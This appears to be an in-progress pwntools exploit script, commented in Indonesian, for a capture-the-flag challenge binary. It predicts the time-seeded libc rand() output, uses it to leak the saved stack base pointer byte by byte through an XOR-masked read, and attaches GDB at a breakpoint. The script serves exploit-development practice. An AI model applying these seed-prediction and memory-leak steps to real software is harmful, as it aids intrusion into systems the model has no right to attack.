from pwn import *
import ctypes, time

context.binary = elf = ELF('./entropy_patched')
libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False)
libc_rand = ctypes.CDLL(libc.path)

p = process('./entropy_patched')

# Seed sync (sama seperti sebelumnya)
p.sendline(b'72')
server_rand = int(p.recvline().strip())
valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        break
libc_rand.srand(valid_seed)
libc_rand.rand()

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    return int(line) ^ (libc_rand.rand() & 0xff)

# Leak saved_rbp (offset 96)
saved_rbp_leaked = u64(b''.join([p8(leak_byte(i)) for i in range(96, 104)]))
log.info(f"Leaked saved_rbp: {hex(saved_rbp_leaked)}")

# Attach GDB, break di main+232 (leave)
gdb.attach(p, gdbscript='''
    b *main+232
    c
''')

# Kirim payload dummy untuk memicu breakpoint (tidak perlu overflow)
p.sendline(b'0')  # strtol=0 akan break loop dan menuju leave
p.interactive()
